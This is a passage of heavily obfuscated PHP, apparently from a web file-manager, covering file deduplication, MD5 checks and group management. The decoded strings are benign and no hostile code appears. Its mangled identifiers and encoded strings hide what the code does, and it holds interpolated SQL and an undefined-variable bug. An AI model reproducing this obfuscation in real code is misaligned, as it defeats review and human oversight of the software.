$©ÇÌÀ±) { $«æ’°Îè = $this->addFileCheckExist($©ÇÌÀ±, $šä¼¤Ì•, $İ•—µØ‚); if ($«æ’°Îè) { CacheLock::unlock($‹ÑÂ£Ş’); return $«æ’°Îè; } } $ªù°·¦” = $this->addFileMake($·ü˜Şî, $İ•—µØ‚, $©ÇÌÀ±, $šä¼¤Ì•, $Õ¢ô°©ƒ, $æ©ÎÛûú); $–ìµ¸ò¥ = $this->addFileData($ªù°·¦”); CacheLock::unlock($‹ÑÂ£Ş’); if (!$šä¼¤Ì• && $–ìµ¸ò¥) { $this->fileMd5Check($–ìµ¸ò¥); } return $–ìµ¸ò¥; } private function fileMd5Check($ÕøŠı€ô) { $¬³°¾†É =& $_SERVER[ïëó©ÒÚ]; $ŞÇëÌÃÌ = array($ÕøŠı€ô[$¬³°¾†É[477]], $ÕøŠı€ô[$¬³°¾†É[84]]); $±ƒ™Úİ½ = $¬³°¾†É[1898] . $ÕøŠı€ô[$¬³°¾†É[84]]; $·ÒîÆí· = $¬³°¾†É[1899] . $ÕøŠı€ô[$¬³°¾†É[477]]; $ö³íóÉ‚ = TaskQueue::add($¬³°¾†É[1900], $ŞÇëÌÃÌ, $±ƒ™Úİ½, $·ÒîÆí·); if (!$ö³íóÉ‚) { $this->fileMd5Set($ÕøŠı€ô[$¬³°¾†É[477]], $ÕøŠı€ô[$¬³°¾†É[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($²¡Ëøøü, $°şµúä) { $ŒÓ–«£² =& $_SERVER[ïëó©ÒÚ]; $„æ»ú« = $this->find($²¡Ëøøü); if (!$„æ»ú« || $„æ»ú«[$ŒÓ–«£²[176]]) { return; } $€¯äø = IO::hashMd5($°şµúä); if (!$€¯äø) { return $ŒÓ–«£²[12]; } $this->where(array($ŒÓ–«£²[477] => $²¡Ëøøü))->save(array($ŒÓ–«£²[176] => $€¯äø)); } public function addFileMake($ÅÃâªªŒ, $÷åŠò†î, $¾³ä®©, $‚‡²õì, $â‚ö—õŸ, $ÌÓÊÁ‡) { $ŒÚ÷À¹ =& $_SERVER[ïëó©ÒÚ]; $ ŒÛÏœŠ = $this->createFileName($â‚ö—õŸ, $¾³ä®©, $‚‡²õì); $ıŒ€±ß = get_path_father($ ŒÛÏœŠ); $šÚ°­¸Ò = get_path_this($ ŒÛÏœŠ); if ($ÌÓÊÁ‡) { $®óÜ ¦ñ = IO::move($ÅÃâªªŒ, $ıŒ€±ß, !1, $šÚ°­¸Ò); } else { $®óÜ ¦ñ = IO::copy($ÅÃâªªŒ, $ıŒ€±ß, !1, $šÚ°­¸Ò); } if (!$®óÜ ¦ñ) { return !1; } $õœ¶Õ‚… = KodIO::defaultDriver(); $Í˜ßä = array($ŒÚ÷À¹[594] => $÷åŠò†î, $ŒÚ÷À¹[1894] => 1, $ŒÚ÷À¹[429] => $â‚ö—õŸ, $ŒÚ÷À¹[818] => $õœ¶Õ‚…[$ŒÚ÷À¹[399]], $ŒÚ÷À¹[430] => $ ŒÛÏœŠ, $ŒÚ÷À¹[1895] => $¾³ä®©, $ŒÚ÷À¹[1896] => $‚‡²õì); return $Í˜ßä; } public function addFileCheckExist($ØÀŒÍÆˆ, $°¢Æİ›ç, $Æ“¹ùĞ–) { $³ƒİá¥¦ =& $_SERVER[ïëó©ÒÚ]; $ãï±¼üÕ = $this->findByHash($ØÀŒÍÆˆ, $°¢Æİ›ç); if (!$ãï±¼üÕ) { return !1; } $ıùãÌ™Ø = array($³ƒİá¥¦[1894] => intval($ãï±¼üÕ[$³ƒİá¥¦[1901]]) + 1, $³ƒİá¥¦[594] => $Æ“¹ùĞ–); $this->where(array($³ƒİá¥¦[478] => $ãï±¼üÕ[$³ƒİá¥¦[477]]))->save($ıùãÌ™Ø); return $ãï±¼üÕ; } public function remove($ü«ü¯å) { $this->linkCountChange($ü«ü¯å, !1); $this->clearEmpty(); return !0; } public function linkAdd($œ³èÙ£Ñ) { $this->linkCountChange($œ³èÙ£Ñ, !0); } public function linkCountChange($‘”Ÿê®¦, $©şºè›ı) { $»–óó˜Ÿ =& $_SERVER[ïëó©ÒÚ]; if (!$‘”Ÿê®¦) { return; } if (!is_array($‘”Ÿê®¦)) { $‘”Ÿê®¦ = array($‘”Ÿê®¦); } $Ş°‡„ªç = array(); foreach ($‘”Ÿê®¦ as $‘Œ¦ğÌ) { $ÄÔ‘²Ü = $‘Œ¦ğÌ . $»–óó˜Ÿ[12]; if (!$Ş°‡„ªç[$ÄÔ‘²Ü]) { $Ş°‡„ªç[$ÄÔ‘²Ü] = 0; } $Ş°‡„ªç[$ÄÔ‘²Ü]++; } $µû©•Ç¼ = array(); foreach ($Ş°‡„ªç as $‘Œ¦ğÌ => $ĞƒõÚŠ) { $ÄÔ‘²Ü = $ĞƒõÚŠ . $»–óó˜Ÿ[12]; if (!$µû©•Ç¼[$ÄÔ‘²Ü]) { $µû©•Ç¼[$ÄÔ‘²Ü] = array(); } $µû©•Ç¼[$ÄÔ‘²Ü][] = $‘Œ¦ğÌ; } foreach ($µû©•Ç¼ as $ĞƒõÚŠ => $ÊŠç«Š´) { if (!$ÊŠç«Š´) { continue; } $ĞƒõÚŠ = $©şºè›ı ? $ĞƒõÚŠ : -intval($ĞƒõÚŠ); $±ìœ¯´Ø = array($»–óó˜Ÿ[477] => array($»–óó˜Ÿ[7], $ÊŠç«Š´)); if ($ĞƒõÚŠ < 0) { $±ìœ¯´Ø[$»–óó˜Ÿ[1901]] = array($»–óó˜Ÿ[1018], abs($ĞƒõÚŠ)); } $this->where($±ìœ¯´Ø)->setAdd($»–óó˜Ÿ[1901], $ĞƒõÚŠ); } } public function findByHash($şıËüÁ, $°¡Ï‹Ç = false) { $´ò÷µ•ì =& $_SERVER[ïëó©ÒÚ]; if (!$şıËüÁ && !$°¡Ï‹Ç) { return !1; } $ŞÔŠÜÎ¶ = array($´ò÷µ•ì[1895] => $şıËüÁ); if ($°¡Ï‹Ç) { $ŞÔŠÜÎ¶ = array($´ò÷µ•ì[1896] => $°¡Ï‹Ç); } return $this->order($´ò÷µ•ì[1902])->where($ŞÔŠÜÎ¶)->find(); } public function clearEmpty($Úœ…®ò² = 0) { $¢¯®óÃ– =& $_SERVER[ïëó©ÒÚ]; $†ëéÛªŞ = time() - 3600 * 24 * $Úœ…®ò²; $ÂÇç©º = $¢¯®óÃ–[1903] . $†ëéÛªŞ; $º‚í¤­½ = $this->where($ÂÇç©º)->select(); if (!$º‚í¤­½) { return; } $¦•©íÀ = new Task($¢¯®óÃ–[1904], $¢¯®óÃ–[12], count($º‚í¤­½)); foreach ($º‚í¤­½ as $›¶ƒ¢ö™) { $¦•©íÀ->update(1); $this->resetFile($›¶ƒ¢ö™); } $¦•©íÀ->end(); } public function resetFile($ËÄå¯ö) { $¦ñ¯û¬ =& $_SERVER[ïëó©ÒÚ]; $óÈ¯¨¢ = array($¦ñ¯û¬[478] => $ËÄå¯ö[$¦ñ¯û¬[477]]); $¼ÁÏË¸û = Model($¦ñ¯û¬[1330])->where($óÈ¯¨¢)->count(); $ÔŒÜ–ó = Model($¦ñ¯û¬[1905])->where($óÈ¯¨¢)->count(); $“ùÕ«÷‘ = intval($¼ÁÏË¸û) + intval($ÔŒÜ–ó); if ($“ùÕ«÷‘ == 0) { IO::remove($ËÄå¯ö[$¦ñ¯û¬[84]]); Model($¦ñ¯û¬[1906])->delete($ËÄå¯ö[$¦ñ¯û¬[477]]); $this->where($óÈ¯¨¢)->delete(); $this->metaSet($ËÄå¯ö[$¦ñ¯û¬[477]], null, null); return; } if ($ËÄå¯ö[$¦ñ¯û¬[1901]] != $“ùÕ«÷‘) { $this->where($óÈ¯¨¢)->save(array($¦ñ¯û¬[1894] => $“ùÕ«÷‘)); } } public function storageInfo($ÄèûÜ©È = false) { $ÅÛ¹–„ =& $_SERVER[ïëó©ÒÚ]; $ôì š¸ = $this->count() + 0.0; $óŸá¹İ´ = 0; $è®ƒÜÑ— = 1; $Óõ‚Ñìä = 0; $Š¶ŸÖí³ = 5000; for ($Ÿù¾Õ¹ = 0; $Ÿù¾Õ¹ < $ôì š¸; $Ÿù¾Õ¹ = $Ÿù¾Õ¹ + $Š¶ŸÖí³) { $ˆÈ¦Ñ½ = $this->limit($Ÿù¾Õ¹, $Ÿù¾Õ¹ + $Š¶ŸÖí³)->select(); foreach ($ˆÈ¦Ñ½ as $á€Ğ¢¶Ğ) { $è®ƒÜÑ— += $á€Ğ¢¶Ğ[$ÅÛ¹–„[76]] * $á€Ğ¢¶Ğ[$ÅÛ¹–„[1901]]; $óŸá¹İ´ += $á€Ğ¢¶Ğ[$ÅÛ¹–„[76]] * ($á€Ğ¢¶Ğ[$ÅÛ¹–„[1901]] - 1); $Óõ‚Ñìä += $á€Ğ¢¶Ğ[$ÅÛ¹–„[1901]]; } } $œŒÍë‰ò = array($ÅÛ¹–„[1907] => $è®ƒÜÑ—, $ÅÛ¹–„[1908] => $óŸá¹İ´, $ÅÛ¹–„[1909] => $óŸá¹İ´ / $è®ƒÜÑ—, $ÅÛ¹–„[80] => $ôì š¸, $ÅÛ¹–„[1910] => $Óõ‚Ñìä); return $œŒÍë‰ò; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\x74\141\142\x6c\145\x4e\141\x6d\145" => "\147\x72\157\x75\160\x5f\x6d\145\x74\141", "\x6d\x65\x74\x61\106\151\x65\154\x64" => "\x67\162\157\165\x70\x49\104"); protected function cacheFunctionAlias($ó´ö™÷œ) { $’›û²Ì» =& $_SERVER[ïëó©ÒÚ]; return array($’›û²Ì»[1911] => array($ó´ö™÷œ[0], $’›û²Ì»[1912]), $’›û²Ì»[1913] => array($ó´ö™÷œ[0], $’›û²Ì»[1914])); } protected function getInfo($‹¬˜‡µ‡, $¼ì˜éç = false) { $Äö“­‹ = $this->getInfoSimple($‹¬˜‡µ‡); if (!$Äö“­‹) { return !1; } if ($¼ì˜éç) { return $this->_listDataApplyItem($Äö“­‹); } return $this->cacheFunctionGet($_SERVER[ïëó©ÒÚ][1915], $‹¬˜‡µ‡); } protected function getInfoSimple($²¡ü¶€Ÿ, $å³¯¢Èƒ = false) { $Í¾ÓÅ»½ =& $_SERVER[ïëó©ÒÚ]; if ($å³¯¢Èƒ) { $îòĞ³¬ = array($Í¾ÓÅ»½[1833] => intval($²¡ü¶€Ÿ)); $œÕŒ¾½ = $this->where($îòĞ³¬)->find(); return is_array($œÕŒ¾½) ? $œÕŒ¾½ : array(); } return $this->cacheFunctionGet($Í¾ÓÅ»½[1916], $²¡ü¶€Ÿ); } protected function groupAdd($Ÿí¶¤¸¼) { $İ²º„¡ =& $_SERVER[ïëó©ÒÚ]; if (!$Ÿí¶¤¸¼[$İ²º„¡[441]] && isset($Ÿí¶¤¸¼[$İ²º„¡[1833]]) && $Ÿí¶¤¸¼[$İ²º„¡[1833]] == 1) { if ($„Üƒ©Ö = $this->getInfoSimple($Ÿí¶¤¸¼[$İ²º„¡[1833]], !0)) { return $Ÿí¶¤¸¼[$İ²º„¡[1833]]; } } else { $„Üƒ©Ö = $this->getInfoSimple($Ÿí¶¤¸¼[$İ²º„¡[441]]); if (!$„Üƒ©Ö) { return !1; } } $À‡ê–ÁÕ = $İ²º„¡[540]; if ($„Üƒ©Ö[$İ²º„¡[530]]) { $À‡ê–ÁÕ = $„Üƒ©Ö[$İ²º„¡[530]] . $„Üƒ©Ö[$İ²º„¡[1833]] . $İ²º„¡[50]; } $½ñÕ = array($İ²º„¡[429] => $this->groupNameAuto($Ÿí¶¤¸¼[$İ²º„¡[441]], $Ÿí¶¤¸¼[$İ²º„¡[32]]), $İ²º„¡[410] => $Ÿí¶¤¸¼[$İ²º„¡[441]], $İ²º„¡[599] => $À‡ê–ÁÕ, $İ²º„¡[1917] => $Ÿí¶¤¸¼[$İ²º„¡[1820]], $İ²º„¡[1918] => 0, $İ²º„¡[1837] => 0); if (isset($Ÿí¶¤¸¼[$İ²º„¡[1857]])) { $½ñÕ[$İ²º„¡[1857]] = $Ÿí¶¤¸¼[$İ²º„¡[1857]]; } else { $ÒëøôÃ¿ = $this->max($İ²º„¡[1857]); if (!$ÒëøôÃ¿) { $ÒëøôÃ¿ = 0; } $½ñÕ[$İ²º„¡[1857]] = $ÒëøôÃ¿ + 1; } if (!empty($Ÿí¶¤¸¼[$İ²º„¡[1833]])) { $½ñÕ[$İ²º„¡[1833]] = $Ÿí¶¤¸¼[$İ²º„¡[1833]]; } $¶¯†¾„Â = $this->add($½ñÕ); $this->setNamePinyin($¶¯†¾„Â, $½ñÕ[$İ²º„¡[32]]); if (isset($Ÿí¶¤¸¼[$İ²º„¡[1919]])) { $this->metaSet($¶¯†¾„Â, array($İ²º„¡[1919] => $Ÿí¶¤¸¼[$İ²º„¡[1919]], $İ²º„¡[1920] => $Ÿí¶¤¸¼[$İ²º„¡[1920]])); unset($Ÿí¶¤¸¼[$İ²º„¡[1919]]); unset($Ÿí¶¤¸¼[$İ²º„¡[1920]]); } Model($İ²º„¡[1330])->groupRootAdd($¶¯†¾„Â); return $¶¯†¾„Â; } protected function groupEdit($âÜûæ, $—èÄ™İÜ) { $¼Şâ˜‘¢ =& $_SERVER[ïëó©ÒÚ]; $µÑùÙ‹ã = $this->getInfoSimple($âÜûæ); if (!$µÑùÙ‹ã) { return !1; } if (!empty($—èÄ™İÜ[$¼Şâ˜‘¢[441]])) { $¥ØÊ¬Õ‡ = $this->getInfoSimple($—èÄ™İÜ[$¼Şâ˜‘¢[441]]); if (!$¥ØÊ¬Õ‡) { return !1; } if ($µÑùÙ‹ã[$¼Şâ˜‘¢[1833]] == $¥ØÊ¬Õ‡[$¼Şâ˜‘¢[1833]]) { return !1; } if ($—èÄ™İÜ[$¼Şâ˜‘¢[441]] != $µÑùÙ‹ã[$¼Şâ˜‘¢[441]]) { if ($¥ØÊ¬Õ‡[$¼Şâ˜‘¢[530]] !== $µÑùÙ‹ã[$¼Şâ˜‘¢[530]] && strpos($¥ØÊ¬Õ‡[$¼Şâ˜‘¢[530]], $µÑùÙ‹ã[$¼Şâ˜‘¢[530]] . $µÑùÙ‹ã[$¼Şâ˜‘¢[1833]] . $¼Şâ˜‘¢[50]) === 0) { return !1; } $—èÄ™İÜ[$¼Şâ˜‘¢[599]] = $¥ØÊ¬Õ‡[$¼Şâ˜‘¢[530]] . $—èÄ™İÜ[$¼Şâ˜‘¢[441]] . $¼Şâ˜‘¢[50]; $this->_changeChildLevel($µÑùÙ‹ã, $¥ØÊ¬Õ‡); } } if (isset($—èÄ™İÜ[$¼Şâ˜‘¢[32]])) { $this->setNamePinyin($âÜûæ, $—èÄ™İÜ[$¼Şâ˜‘¢[32]]); } if (isset($—èÄ™İÜ[$¼Şâ˜‘¢[1919]])) { $this->metaSet($âÜûæ, array($¼Şâ˜‘¢[1919] => $—èÄ™İÜ[$¼Şâ˜‘¢[1919]], $¼Şâ˜‘¢[1920] => $—èÄ™İÜ[$¼Şâ˜‘¢[1920]])); unset($—èÄ™İÜ[$¼Şâ˜‘¢[1919]]); unset($—èÄ™İÜ[$¼Şâ˜‘¢[1920]]); } $this->_clearChildrenCache($µÑùÙ‹ã); return $this->where(array($¼Şâ˜‘¢[1921] => $âÜûæ))->save($—èÄ™İÜ); } private function _clearChildrenCache($±ë—óù) { $üõÇºŞ° =& $_SERVER[ïëó©ÒÚ]; $—“àÚ = array($üõÇºŞ°[599] => array($üõÇºŞ°[559], $±ë—óù[$üõÇºŞ°[530]] . $±ë—óù[$üõÇºŞ°[1833]] . $üõÇºŞ°[560])); $“¢’¡¼ = $this->field($üõÇºŞ°[1833])->where($—“àÚ)->select(); foreach ($“¢’¡¼ as $˜Õå¯ÑÖ) { $this->_clearCache($˜Õå¯ÑÖ[$üõÇºŞ°[1833]]); } } private function _clearCache($•¿Ø”ññ) { $û¦ÍŒ¶ =& $_SERVER[ïëó©ÒÚ]; $this->cacheFunctionClear($û¦ÍŒ¶[1915], $•¿Ø”ññ); $this->cacheFunctionClear($û¦ÍŒ¶[1916], $•¿Ø”ññ); } private function _changeChildLevel($œ”ÒÍíû, $ÚæÆ–Æì, $¶Û€Ì÷ı = false) { $ĞÊĞ€Ôğ =& $_SERVER[ïëó©ÒÚ]; $ŠÑÅ‡­ = $œ”ÒÍíû[$ĞÊĞ€Ôğ[530]] . $œ”ÒÍíû[$ĞÊĞ€Ôğ[1833]] . $ĞÊĞ€Ôğ[50]; $©¢ÉÃÂ¦ = $ÚæÆ–Æì[$ĞÊĞ€Ôğ[530]] . $ÚæÆ–Æì[$ĞÊĞ€Ôğ[1833]] . $ĞÊĞ€Ôğ[50] . $œ”ÒÍíû[$ĞÊĞ€Ôğ[1833]] . $ĞÊĞ€Ôğ[50]; if ($¶Û€Ì÷ı) { $©¢ÉÃÂ¦ = $ÚæÆ–Æì[$ĞÊĞ€Ôğ[530]] . $ÚæÆ–Æì[$ĞÊĞ€Ôğ[1833]] . $ĞÊĞ€Ôğ[50]; } $ƒ†Š½² = array($ĞÊĞ€Ôğ[599] => array($ĞÊĞ€Ôğ[559], $œ”ÒÍíû[$ĞÊĞ€Ôğ[530]] . $œ”ÒÍíû[$ĞÊĞ€Ôğ[1833]] . $ĞÊĞ€Ôğ[560])); $ÚÊÇõçç = array($ĞÊĞ€Ôğ[599] => array($ĞÊĞ€Ôğ[608], "\162\145\160\154\141\143\145\50\160\x61\x72\145\x6e\164\x4c\145\166\145\154\54\47{$ŠÑÅ‡­}\47\x2c\x27{$©¢ÉÃÂ¦}\47\51")); $this->_clearChildrenCache($œ”ÒÍíû); $this->where($ƒ†Š½²)->data($ÚÊÇõçç)->save(); } public function setNamePinyin($ˆ»şÑšÂ, $ôúšëŒ¯ = false) { $ä¥§ßˆÕ =& $_SERVER[ïëó©ÒÚ]; if (!$ôúšëŒ¯) { $şæñ•˜ = $this->getInfoSimple($ˆ»şÑšÂ); $ôúšëŒ¯ = $şæñ•˜[$ä¥§ßˆÕ[32]]; } if (!Input::check($ôúšëŒ¯, $ä¥§ßˆÕ[602])) { $this->metaSet($ˆ»şÑšÂ, $ä¥§ßˆÕ[474], null); $this->metaSet($ˆ»şÑšÂ, $ä¥§ßˆÕ[473], null); return; } $¸Íè¡áÂ = array($ä¥§ßˆÕ[474] => str_replace($ä¥§ßˆÕ[53], $ä¥§ßˆÕ[12], Pinyin::get($ôúšëŒ¯)), $ä¥§ßˆÕ[473] => Pinyin::get($ôúšëŒ¯, $ä¥§ßˆÕ[603])); $this->metaSet($ˆ»şÑšÂ, $¸Íè¡áÂ); } protected function groupStatus($Û¼î°Ş¯, $×Ñí Á¦) { $í›à¸®¦ =& $_SERVER[ïëó©ÒÚ]; $Õ‘ôÇÄ¯ = $this->getInfoSimple($Û¼î°Ş¯); if (!$Õ‘ôÇÄ¯) { return !1; } if ($×Ñí Á¦ == $í›à¸®¦[88]) { $ëì²Û = $this->parentLevelArray($Õ‘ôÇÄ¯[$í›à¸®¦[530]]); } else { $ëàÚÁ™¯ = array($í›à¸®¦[599] => array($í›à¸®¦[559], $Õ‘ôÇÄ¯[$í›à¸®¦[530]] . $Õ‘ôÇÄ¯[$í›à¸®¦[1833]] . $í›à¸®¦[560])); $ëì²Û = $this->where($ëàÚÁ™¯)->field($í›à¸®¦[1833])->select(); $ëì²Û = array_to_keyvalue($ëì²Û, $í›à¸®¦[12], $í›à¸®¦[1833]); } $ëì²Û[] = $Õ‘ôÇÄ¯[$í›à¸®¦[1833]]; $¨¾«„Õ“ = array(); foreach ($ëì²Û as $Û¼î°Ş¯) { $¨¾«„Õ“[] = array($í›à¸®¦[1833] => $Û¼î°Ş¯, $í›à¸®¦[94] => $í›à¸®¦[760], $í›à¸®¦[374] => $×Ñí Á¦); $this->_clearCache($Û¼î°Ş¯); } return Model($í›à¸®¦[1922])->addAll($¨¾«„Õ“, array(), !0); } protected function groupRemove($™¤ªçş, $†‰ú¢¼ç = false) { $¥ÃÃ£” =& $_SERVER[ïëó©ÒÚ]; $İµô®§É = array($¥ÃÃ£”[1833] => $™¤ªçş); $µ·é˜ëê = $this->where($İµô®§É)->find(); if (!$µ·é˜ëê || $µ·é˜ëê[$¥ÃÃ£”[441]] == 0) { return !1; } if (!$†‰ú¢¼ç) { $ù•ØÍæ¯ = $this->getInfoSimple($µ·é˜ëê[$¥ÃÃ£”[441]]); $this->_changeChildLevel($µ·é˜ëê, $ù•ØÍæ¯, !0); $this->where(array($¥ÃÃ£”[441] => $™¤ªçş))->save(array($¥ÃÃ£”[441] => $µ·é˜ëê[$¥ÃÃ£”[441]])); } Model($¥ÃÃ£”[1922])->where($İµô®§É)->delete(); Model($¥ÃÃ£”[1923])->where($İµô®§É)->delete(); Model($¥ÃÃ£”[835])->groupRootRemove($™¤ªçş); return $this->where($İµô®§É)->delete(); } protected function groupSort($Æš‡ÙàØ) { $³ˆØÌ‘ =& $_SERVER[ïëó©ÒÚ]; $şºÉ¶…Ö = array(); foreach ($Æš‡ÙàØ as $±¼¶÷ => $õÇ‘Ã) { $şºÉ¶…Ö[] = array($³ˆØÌ‘[1833], $õÇ‘Ã, $³ˆØÌ‘[1857], $±¼¶÷ + 1); } $this->saveAll($şºÉ¶…Ö); } public function listData() { $â¹«¶¢É = $this->_makeOrder()->selectPage(50); $this->_listDataApply($â¹«¶¢É[$_SERVER[ïëó©ÒÚ][369]]); return $â¹«¶¢É; } private function _makeOrder($Â‚‡‘‡ = '') { $İù„÷ø€ =& $_SERVER[ïëó©ÒÚ]; $œòÔ˜Ò— = array($İù„÷ø€[1833], $İù„÷ø€[32], $İù„÷ø€[1822], $İù„÷ø€[200]); $¿ïßªÖ = array($İù„÷ø€[459] => $İù„÷ø€[460], $İù„÷ø€[461] => $İù„÷ø€[462]); $ïèÂúƒ‹ = Input::get($İù„÷ø€[466], $İù„÷ø€[7], $İù„÷ø€[1837], $œòÔ˜Ò—); $ãªĞÇ‚ = Input::get($İù„÷ø€[467], $İù„÷ø€[7], $İù„÷ø€[1924], array($İù„÷ø€[1924], $İù„÷ø€[461])); $ãªĞÇ‚ = $¿ïßªÖ[$ãªĞÇ‚]; $Â‚‡‘‡ = $Â‚‡‘‡ . "{$ïèÂúƒ‹}\x20{$ãªĞÇ‚}\54\40\147\x72\157\x75\160\x49\104\40\141\163\143"; return $this->order($Â‚‡‘‡); } public function listChild($¸íµ¬®Ç) { $Ç€™„û» =& $_SERVER[ïëó©ÒÚ]; $ã™ƒ¢óé = $this->where(array($Ç€™„û»[441] => $¸íµ¬®Ç))->_makeOrder()->selectPage(200); $this->_listDataApply($ã™ƒ¢óé[$Ç€™„û»[369]]); return $ã™ƒ¢óé; } public function listChildIds($¢‚ÂåÎ‡) { $éêéã¨‰ =& $_SERVER[ïëó©ÒÚ]; if (is_string($àÛàç†·)) { $¢‚ÂåÎ‡ = explode($éêéã¨‰[50], $¢‚ÂåÎ‡); } $¤Æ±©•í = $this->where(array($éêéã¨‰[1833] => array($éêéã¨‰[7], $¢‚ÂåÎ‡)))->field($éêéã¨‰[1925])->select(); if (!$¤Æ±©•í) { return !1; } $ß’·‘ÑÃ = array(); foreach ($¤Æ±©•í as $ƒ‰Ç°›) { $ß’·‘ÑÃ[] = "\x73\x65\x6c\145\x63\164\40\x67\x72\x6f\165\x70\111\104\40\x66\x72\157\x6d\40\x60\x67\x72\x6f\165\x70\x60\40\167\x68\145\x72\145\40\x70\141\162\x65\156\x74\114\145\x76\145\154\40\x6c\x69\x6b\145\40\47{$ƒ‰Ç°›[$éêéã¨‰[530]]}{$ƒ‰Ç°›[$éêéã¨‰[1833]]}\x2c\45\47"; } $ß’·‘ÑÃ = implode($éêéã¨‰[1926], $ß’·‘ÑÃ); $¤Æ±©•í = $this->query($ß’·‘ÑÃ); if (!$¤Æ±©•í) { return array(); } $¢‚ÂåÎ‡ = array_to_keyvalue($¤Æ±©•í, $éêéã¨‰[12], $éêéã¨‰[1833]); return array_unique($¢‚ÂåÎ‡); } public function listByID($€‚ÅğÆœ) { $ùÛÌÅ·¥ =& $_SERVER[ïëó©ÒÚ]; if (!$€‚ÅğÆœ) { return array(); } $ãéÓø¦£ = array($ùÛÌÅ·¥[1833] => array($ùÛÌÅ·¥[7], $€‚ÅğÆœ)); $˜ƒÀ‰˜ = $this->where($ãéÓø¦£)->select(); $˜ƒÀ‰˜ = array_sort_keep($˜ƒÀ‰˜, $ùÛÌÅ·¥[1833], $€‚ÅğÆœ); $this->_listDataApply($˜ƒÀ‰˜); return $˜ƒÀ‰˜; } public function listSearch($¶ĞƒôŒ÷) { $ÎÇ»¹—Û =& $_SERVER[ïëó©ÒÚ]; $üŠóàÈë = $¶ĞƒôŒ÷[$ÎÇ»¹—Û[1927]]; $Ç×˜‡˜Õ = isset($¶ĞƒôŒ÷[$ÎÇ»¹—Û[1928]]) ? $¶ĞƒôŒ÷[$ÎÇ»¹—Û[1928]] : !1; if (!trim($üŠóàÈë)) { return !1; } $üŠóàÈë = str_replace($ÎÇ»¹—Û[1929], $ÎÇ»¹—Û[1930], $üŠóàÈë); $¿™œËÄÒ = array($ÎÇ»¹—Û[1833] => array($ÎÇ»¹—Û[383], "{$üŠóàÈë}\x25"), $ÎÇ»¹—Û[32] => array($ÎÇ»¹—Û[383], "\x25{$üŠóàÈë}\x25"), $ÎÇ»¹—Û[1003] => $ÎÇ»¹—Û[1931]); if ($Ç×˜‡˜Õ) { $é¼ƒµñ = $this->getInfoSimple($Ç×˜‡˜Õ); $î÷Éğ = $é¼ƒµñ[$ÎÇ»¹—Û[530]] . $Ç×˜‡˜Õ . $ÎÇ»¹—Û[560]; $¿™œËÄÒ = array($¿™œËÄÒ, array($ÎÇ»¹—Û[530] => array($ÎÇ»¹—Û[383], $î÷Éğ))); } $¿™œËÄÒ = $this->parseWhereLike($¿™œËÄÒ); $«È¼ÖÄş = $this->_makeOrder()->where($¿™œËÄÒ)->selectPage(20); $«È¼ÖÄş = $«È¼ÖÄş ? $«È¼ÖÄş : array($ÎÇ»¹—Û[369] => array(), $ÎÇ»¹—Û[366] => array()); if (!$«È¼ÖÄş || count($«È¼ÖÄş[$ÎÇ»¹—Û[369]]) < 5 && Input::check($üŠóàÈë, $ÎÇ»¹—Û[318])) { $Å§…èÇ¢ = $this->groupChildrenAll($Ç×˜‡˜Õ); $÷±›¤¯ = $this->_searchFromMeta($ÎÇ»¹—Û[473], $üŠóàÈë, 10, $Å§…èÇ¢); $ˆÁ˜åâ = $this->_searchFromMeta($ÎÇ»¹—Û[474], $üŠóàÈë, 10, $Å§…èÇ¢); $ôœïèª = array_merge($÷±›¤¯, $ˆÁ˜åâ, $«È¼ÖÄş[$ÎÇ»¹—Û[369]]); $«È¼ÖÄş[$ÎÇ»¹—Û[369]] = array_unique_by_key($ôœïèª, $ÎÇ»¹—Û[1833]); $«È¼ÖÄş[$ÎÇ»¹—Û[366]][$ÎÇ»¹—Û[367]] = count($«È¼ÖÄş[$ÎÇ»¹—Û[369]]); $«È¼ÖÄş[$ÎÇ»¹—Û[366]][$ÎÇ»¹—Û[368]] = ceil($«È¼ÖÄş[$ÎÇ»¹—Û[366]][$ÎÇ»¹—Û[367]] / $«È¼ÖÄş[$ÎÇ»¹—Û[366]][$ÎÇ»¹—Û[363]]); } $this->_listDataApply($«È¼ÖÄş[$ÎÇ»¹—Û[369]]); return $«È¼ÖÄş; } protected function groupChildrenAll($‰İßı†) { $Ôæ£¶Û… =& $_SERVER[ïëó©ÒÚ]; if (!$‰İßı†) { return !1; } if (is_string($‰İßı†)) { $‰İßı† = array($‰İßı†); } $»şÑõ — = $‰İßı†; foreach ($‰İßı† as $·Ù•úôÈ) { $«ôóÅ = $this->getInfoSimple($·Ù•úôÈ); $½„¹Óñ = array($Ôæ£¶Û…[530] => array($Ôæ£¶Û…[383], $«ôóÅ[$Ôæ£¶Û…[530]] . $·Ù•úôÈ . $Ôæ£¶Û…[560])); $Ëå˜‰³Ş = $this->field($Ôæ£¶Û…[1833])->where($½„¹Óñ)->select(); $»şÑõ — = array_merge($»şÑõ —, array_to_keyvalue($Ëå˜‰³Ş, $Ôæ£¶Û…[12], $Ôæ£¶Û…[1833])); } return array_unique($»şÑõ —); } private function _searchFromMeta($¹¾î°ö–, $Ú¡æÑè¯, $Éğ¼áÖá, $çòÜƒÂÜ) { $¦õ­‹ô =& $_SERVER[ïëó©ÒÚ]; $Ú¡æÑè¯ = strtolower($Ú¡æÑè¯); $—§¡½ = array($¦õ­‹ô[94] => $¹¾î°ö–, $¦õ­‹ô[374] => array($¦õ­‹ô[383], "\45{$Ú¡æÑè¯}\45")); $—§¡½ = $this->parseWhereLike($—§¡½); if ($çòÜƒÂÜ) { $—§¡½[$¦õ­‹ô[1833]] = array($¦õ­‹ô[7], $çòÜƒÂÜ); } $Ôˆ¾âı† = Model($¦õ­‹ô[1932])->where($—§¡½)->limit($Éğ¼áÖá)->select(); if (!$Ôˆ¾âı†) { return array(); } $Ôˆ¾âı† = array_to_keyvalue($Ôˆ¾âı†, $¦õ­‹ô[12], $¦õ­‹ô[1833]); $ÙÄÂ°å² = $this->where(array($¦õ­‹ô[1921] => array($¦õ­‹ô[7], $Ôˆ¾âı†)))->select(); if (!$ÙÄÂ°å²) { return array(); } return $ÙÄÂ°å²; } protected function _listDataApplyItem($Ò¶¯‰Ü) { $ÀĞË­·¦ = array($Ò¶¯‰Ü); $this->_listDataApply($ÀĞË­·¦); return $ÀĞË­·¦[0]; } protected function _listDataApply(&$„…Ñáæı) { $„®Ú×¼ó =& $_SERVER[ïëó©ÒÚ]; if (!$„…Ñáæı) { return; } $Ô¯Ê£ = array_to_keyvalue($„…Ñáæı, $„®Ú×¼ó[12], $„®Ú×¼ó[1833]); 